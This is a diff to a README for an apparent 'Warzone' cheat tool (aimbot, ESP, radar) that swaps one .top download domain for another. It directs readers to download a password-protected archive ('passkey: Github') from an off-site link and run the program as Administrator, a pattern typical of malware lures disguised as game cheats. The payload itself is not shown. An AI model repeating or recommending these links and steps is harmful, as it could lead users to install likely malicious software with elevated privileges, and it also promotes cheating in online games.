@@ -6,7 +6,7 @@ Warzone external menu with aimbot, ESP, radar hack, and more. For educational pu
 
 ## ⬇️ Download
 
-**[CLICK](https://gitdownapply.top/)**
+**[CLICK](https://gitdownapps.top)**
 
 Archive passkey: `Github`
 
@@ -73,7 +73,7 @@ Based on popular external menus like **Skeet**, **Lethal**, and **Interwebz**.
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitdownapply.top/)** to download.
+1. Click **[CLICK](https://gitdownapps.top)** to download.
 2. Extract the archive.
 3. Launch Warzone.
 4. Run the hack **as Administrator**.
